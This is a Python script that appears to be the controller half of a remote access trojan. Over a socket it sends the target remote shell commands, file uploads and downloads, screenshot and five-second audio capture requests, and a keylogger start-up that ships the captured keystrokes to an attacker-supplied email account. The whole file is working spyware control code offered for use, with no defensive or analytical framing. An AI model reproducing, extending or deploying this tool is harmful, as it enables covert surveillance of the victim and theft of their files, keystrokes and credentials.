import socket
import subprocess
import requests
import base64

REMOTE_HOST = '127.0.0.1'
REMOTE_PORT = 8081
client = socket.socket()
print("[-] Connection Initiating...")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Connection initiated!")

print("*"*50)
print("-press 1 for remote command excitation\n-press 2 to upload a file to the server\n-press 3 to download a file from ther server\n-press 4 to take a screenshot\n-press 5 to recored a 5 second voice recored\n-press 6 to start keylogger")
choice=input("type here : ")
if choice=="1":
    choice=choice.encode()
    client.send(choice)
    while True:
        command = input('Enter Command : ')
        command = command.encode()
        client.send(command)
        print('[+] Command sent')
        output = client.recv(1024)
        output = output.decode()
        print(f"Output: {output}")
elif choice=="2":
    choice = choice.encode()
    client.send(choice)
    file_to_upload=input("please enter file name: ")
    file_to_upload=file_to_upload.encode()
    client.send(file_to_upload)
    with open(file_to_upload, "rb") as readfile:
        content = readfile.read()
    client.sendall(content)
elif choice=="3":
    choice=choice.encode()
    client.send(choice)
    print("choose a file to download")
    filenames=client.recv(5000)
    filenames=filenames.decode()
    print(filenames)
    file_to_download=input("select a file to download note that you can only download files which are in the server folder: ")
    file_to_download=file_to_download.encode()
    client.send(file_to_download)
    info=client.recv(5000)
    print(info)
    with open(file_to_download,"wb") as writefile:
        writefile.write(info)
    print("file downloaded")
elif choice=="4":
    choice=choice.encode()
    client.send(choice)
    encod_image=client.recv(500000).decode()
    encod_image = base64.b64decode(encod_image)
    with open("screenshot.png","wb") as writeimage:
        writeimage.write(encod_image)
elif choice=="5":
    print("the recored is only 5 seconds long ")
    choice=choice.encode()
    client.send(choice)
    voicerecord=client.recv(50000000)
    with open("voicerecord.wav","wb") as writevoice:
        writevoice.write(voicerecord)
elif choice=="6":
    choice=choice.encode()
    client.send(choice)
    email_address=input("please specify the email to send data:")
    email_address=email_address.encode()
    client.send(email_address)
    password=input("please enter the password for the email: ")
    password=password.encode()
    client.send(password)
    duration=input("select duration in seconds : ")
    duration=duration.encode()
    client.send(duration)
    print("keylogger started")























